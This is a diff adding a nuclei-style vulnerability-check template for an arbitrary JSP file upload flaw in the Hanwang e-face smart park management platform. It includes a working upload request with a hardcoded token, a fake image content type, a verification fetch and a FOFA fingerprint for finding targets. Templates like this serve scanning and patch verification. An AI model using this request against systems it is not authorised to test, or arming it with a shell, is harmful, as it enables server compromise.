@@ -1,0 +1,60 @@
+id: poc-yaml-hw-e-face-pass-spmp-resourceuploadfile-do-anyfile-upload
+info:
+  name: 汉王e脸通智慧园区管理平台 resourceUploadFile.do 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  metadata:
+    finger: e脸通智慧园区管理平台
+    fofa: icon_hash="1380907357"
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/manage/dgmCommand/resourceUploadFile.do?recoToken=ZuZBOrvLG8M"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: image/jpeg
+
+      {{t2}}
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        regex:
+          - "(?P<file>[0-9a-z]{32}).jsp"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/manage/resource/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
